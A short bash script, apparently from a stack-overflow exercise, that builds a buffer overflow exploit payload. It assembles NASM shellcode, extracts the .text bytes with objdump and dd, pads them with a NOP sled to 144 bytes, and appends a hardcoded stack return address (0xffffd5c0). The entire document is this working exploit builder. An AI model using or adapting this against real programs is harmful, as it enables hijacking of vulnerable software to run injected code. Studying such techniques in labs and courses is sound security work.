nasm -f elf32 $1.asm
details=`objdump -x $1.o | grep .text | head -n 1 | grep [0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f] -o`
length=`echo $details | cut -d ' ' -f1`
offset=`echo $details | cut -d ' ' -f4`
payload=`dd if=$1.o bs=1 obs=1 skip=$(printf "%d" 0x$offset) count=$(printf "%d" 0x$length) 2> /dev/null`
padding=`echo 144-$(echo $payload | wc -c)-4 | bc`
for ((i=0; i<=$padding; i++))
do
    echo -en "\x90"
done
echo -en $payload
echo -en '\xC0\xD5\xFF\xFF'
